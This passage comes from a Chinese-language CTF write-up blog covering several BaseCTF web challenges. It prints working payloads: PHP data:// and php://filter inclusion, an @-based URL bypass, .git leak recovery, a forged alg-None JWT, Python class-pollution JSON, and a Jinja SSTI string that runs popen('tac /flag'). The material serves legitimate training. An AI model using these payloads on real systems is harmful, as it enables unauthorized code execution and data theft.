(<span class="title function_ invoke__">strpos</span>(<span class="variable">$challenge</span>, <span class="string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;这不是 Aura 的博客！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$blog_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$challenge</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$blog_content</span>, <span class="string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;请去博客里面写下感想哦~&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span></span><br><span class="line"><span class="variable">$gift</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;gift&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$gift</span>);</span><br></pre></td></tr></table></figure>
<p>读取一个Aura的文件，扫过了，没有，但是这里竟然可以用data来读…我还得去仔细看看伪协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pen=data://text/plain,Aura</span><br></pre></td></tr></table></figure>
<p>第二个判断的话, 我们要求页面的开头为 <a href="http://jasmineaura.github.io">http://jasmineaura.github.io</a>	我们可以利用 @来进行隔断, 将@前面的内容当做用户名 (参考<a href="https://cloud.tencent.com/developer/article/2288231">https://cloud.tencent.com/developer/article/2288231</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pen=data://text/plain,Aura&amp;challengehttp://jasmineaura.github.io@127.0.0.1</span><br></pre></td></tr></table></figure>
<p>随后的gift就用伪协议和base来读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h1>Back to the future</h1>
<p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本题理论不需要扫描器</span><br></pre></td></tr></table></figure>
<p>根据提示，应该有一个叫robots.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。https://blog.csdn.net/weixin_45246254/article/details/111604973</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/image-20250313200223095-17446204020132.png" alt="image-20250313200223095"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GitHacker是一个用于从目标网站恢复.git仓库的工具，从暴露的.git目录中恢复源代码和敏感信息</span><br><span class="line"></span><br><span class="line">Git元数据泄露利用</span><br><span class="line">GitHacker通过解析网站暴露的 .git/objects 目录下的对象文件（如commit、tree、blob），重建完整的Git仓库历史记录。</span><br><span class="line">支持内容：恢复被删除的提交、分支、文件版本差异等。</span><br><span class="line">技术本质：基于Git存储机制（哈希寻址、松散对象压缩）逆向工程。</span><br><span class="line">自动化流程</span><br><span class="line">递归下载：遍历下载 .git 目录内的所有文件（包括config、HEAD、index）。</span><br><span class="line">对象重组：将松散对象文件（/objects/xx/xxxxx）还原为可读的源码文件。</span><br><span class="line">提交历史回溯：解析 logs/HEAD 和 refs/ 文件，重建版本树。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">githacker --url http://gz.imxbt.cn:20634/ --output-folder C:\Users\ssz\Desktop\study\123</span><br><span class="line"></span><br><span class="line">git log  #查看 git 历史</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250313203839098-17446204020131.png" alt="image-20250313203839098"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git checkout 9d85f10e0192ef630e10d7f876a117db41c30417  #切换到相应的分支</span><br><span class="line">git checkout 是 Git 版本控制系统中的 多用途核心命令，主要用于 切换代码版本、恢复文件状态、创建分支 等操作</span><br></pre></td></tr></table></figure>
<p>然后就可以看flag.txt了</p>
<h1>HTTP 是什么呀</h1>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">成为嘿客的第一步！当然是 HTTP 啦！</span><br><span class="line">可以多使用搜索引擎搜索每个参数的含义以及传参方式</span><br><span class="line"></span><br><span class="line">看看你是怎么到达最后一个页面的，中途是不是经过了什么？</span><br><span class="line"></span><br><span class="line">这一串乱码是什么呀。等下，比赛好像叫做 BaseCTF？</span><br></pre></td></tr></table></figure>
<p>进去之后看了有两分钟，这个界面优化的不太好，关键就在上面的那个表格</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250313210419605-17446204020143.png" alt="image-20250313210419605"></p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250313210426960-17446204020144.png" alt="image-20250313210426960"></p>
<p>挺基础的</p>
<p>根据提示，需要抓包</p>
<p>然后就看到base64加密的flag了</p>
<h1>No JWT</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有 JWT!</span><br></pre></td></tr></table></figure>
<p>附件源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 随机生成 secret_key</span></span><br><span class="line">app.secret_key = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    username = data.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = data.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 其他用户都给予 user 权限</span></span><br><span class="line">    token = jwt.encode(&#123;</span><br><span class="line">            <span class="string">&#x27;sub&#x27;</span>: username,</span><br><span class="line">            <span class="string">&#x27;role&#x27;</span>: <span class="string">&#x27;user&#x27;</span>,  <span class="comment"># 普通用户角色</span></span><br><span class="line">            <span class="string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(hours=<span class="number">1</span>)</span><br><span class="line">        &#125;, app.secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 接口</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    token = request.headers.get(<span class="string">&#x27;Authorization&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> token:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = jwt.decode(token.split(<span class="string">&quot; &quot;</span>)[<span class="number">1</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>, <span class="string">&quot;verify_exp&quot;</span>: <span class="literal">False</span>&#125;)</span><br><span class="line">            <span class="comment"># 检查用户角色是否为 admin</span></span><br><span class="line">            <span class="keyword">if</span> decoded.get(<span class="string">&#x27;role&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    flag_content = f.read()</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;flag&#x27;</span>: flag_content&#125;), <span class="number">200</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Access denied: admin only&#x27;</span>&#125;), <span class="number">403</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Flag file not found&#x27;</span>&#125;), <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token has expired&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid token&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Token is missing&#x27;</span>&#125;), <span class="number">401</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>根据题目信息，应该是修改加密方式为None，但是我们进去/login界面之后没有JWT字段<br>
根据源码，我们应该是要登入一个user，然后他会自己回显出来一个JWT。</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250313235514359-17446204020145.png" alt="image-20250313235514359"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;a&quot;:&quot;c&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzQxODg0NTgxfQ.fXvfAVO330FmVbeXv72a0i8RsNr4rX1QG4r0OB662YU</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314001058220-17446204020149.png" alt="image-20250314001058220"></p>
<p>修改HS256为None，user为admin分段以点隔开删除第三部分并保留最后的点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOm51bGwsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc0MTg4NjE3OX0.</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/flag</span><br><span class="line"></span><br><span class="line">Authorization: Bearer eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOm51bGwsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc0MTg4NjE3OX0.</span><br></pre></td></tr></table></figure>
<p>使用Authorization的原因是附件源码要求：</p>
<p><strong>Header格式</strong>：<code>Bearer</code> + 空格 + 伪造Token</p>
<p>为什么加上Bearerhttps://blog.csdn.net/qq_34250494/article/details/133170678</p>
<h1>Jinja Mark</h1>
<p>题目描述：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssti注入只会用带花括号的payload？逊诶</span><br></pre></td></tr></table></figure>
<p>我们进去之后发现<br>
<img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314191445568-17446204020146.png" alt="image-20250314191445568"></p>
<p>我们看到这里肯定是想着去/flag看看</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314191729313-17446204020147.png" alt="image-20250314191729313"></p>
<p>果然，但是这里应该可以用bp爆破</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314191801824-17446204020148.png" alt="image-20250314191801824"></p>
<p>结果是5346，但是里面有源码，没有flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/magic&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br></pre></td></tr></table></figure>
<p>这里涉及知识点：原型链污染(另开页面)。简单来说就是可以通过原型链污染把第一行的黑名单给改了，比如改成空的。</p>
<p>接下来我们去/index当中看看。传入随便传进去一个东西看看。</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314192307009-174462040201410.png" alt="image-20250314192307009"></p>
<p>看到这里我们必须想到ssti漏洞，如果想不到，题目信息已经告诉你了。<br>
我们传入两组花括号看看，结果是花括号被过滤了，怎么办呢？</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314192418277-174462040201411.png" alt="image-20250314192418277"></p>
<p>进去/magic</p>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250314192437652-174462040201412.png" alt="image-20250314192437652"></p>
<p>这里的“记得用POST方法把魔术交上来”在我们拿到的源码当中出现过，那么这里我们就可以进行原型链污染，将过滤的花括号给改成空的。这里的源码是python，我们用ssti修改他的值(<a href="https://xz.aliyun.com/news/12518?time__1311=eqUxu7DtD%3DTND%2FD0Dd%3DitG8RACuWoD&amp;u_atoken=0d51e5d3cd115a0d879fb72d56b21eb7&amp;u_asig=0a47309317419553385443514e0086">python原型链污染</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;BLACKLIST_IN_index&quot;:&quot;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">记得Content-Type: application/json</span><br></pre></td></tr></table></figure>
<p>之后就可以在/index当中ssti注入了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>我看别人的payload，似乎这个ssti存在简化的操作，具体会写在ssti专栏里面。</p>
<h1>Lucky Number</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原型链污染的大手可以伸很长的哦</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">你不会以为这里真的有flag吧？</span><br><span class="line"></span><br><span class="line">想要flag的话先提交我的幸运数字<span class="number">5346</span></span><br><span class="line"></span><br><span class="line">但是我的主人觉得我泄露了太多信息，就把我的幸运数字给删除了</span><br><span class="line"></span><br><span class="line">但是听说在heaven中有一种create方法，配合__kwdefaults__可以创造出任何事物，你可以去/m4G1c里尝试着接触到这个方法</span><br><span class="line"></span><br><span class="line">下面是前人留下来的信息，希望对你有用</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> heaven</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">BLACKLIST_IN_index = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_json</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/m4G1c&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pollute</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.is_json:</span><br><span class="line">            merge(json.loads(request.data), instance)</span><br><span class="line">            result = heaven.create()</span><br><span class="line">            message = result[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;这个魔术还行吧</span></span><br><span class="line"><span class="string">&quot;</span> + message</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我要json的魔术&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;记得用POST方法把魔术交上来&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#heaven.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">kon=<span class="string">&quot;Kon&quot;</span>, pure=<span class="string">&quot;Pure&quot;</span>, *, confirm=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;这是你的lucky_number，请拿好，去/check下检查一下吧&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="string">&quot;lucky_number&quot;</span>]&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;你有什么想创造的吗？&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>反正的话，做难题需要对python和联想能力有较高的造诣。比如这里的import heaven，看了好久才知道是本地定义的一个py文件、源码说了，他把幸运数字5346给删了，具体在哪里删除呢？就在heaven的create当中删除了。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">    <span class="comment"># 分支1：当 confirm=True 且未注入 lucky_number 时触发 </span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;需指定创造内容&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: <span class="string">&quot;nope&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> confirm <span class="keyword">and</span> <span class="string">&quot;lucky_number&quot;</span> <span class="keyword">in</span> create.__kwdefaults__:</span><br><span class="line">    <span class="comment"># 分支2：当 confirm=True 且存在 lucky_number 默认值时触发 </span></span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;返回预设的幸运数字&quot;</span>, <span class="string">&quot;lucky_number&quot;</span>: create.__kwdefaults__[<span class="string">&quot;lucky_number&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
<p>所以这里我们需要通过原型链污染将confirm污染为True，并添加一个lucky_number为5346</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用bp</span><br><span class="line"></span><br><span class="line">&#123;&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;heaven&quot;:&#123;&quot;create&quot;:&#123;&quot;__kwdefaults__&quot;:&#123;&quot;confirm&quot;:&quot;True&quot;,&quot;lucky_number&quot;:&quot;5346&quot;&#125;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>成功之后根据提示就可以ssti注入了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h1>圣钥之战1.0</h1>
<p>题目描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">J1ngHong大魔王不会让你污染圣钥的！</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/01/baseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/D:%5CBlog%5Csource_posts%5CbaseCtfWp%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%5Cimage-20250316164800491.png" alt="image-20250316164800491"></p>
<p>我们进去/read看看</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">J1ngHong说：你想read flag吗？</span><br><span class="line">那么圣钥之光必将阻止你！</span><br><span class="line">但是小小的源码没事，因为你也读不到flag(乐)</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_json</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span 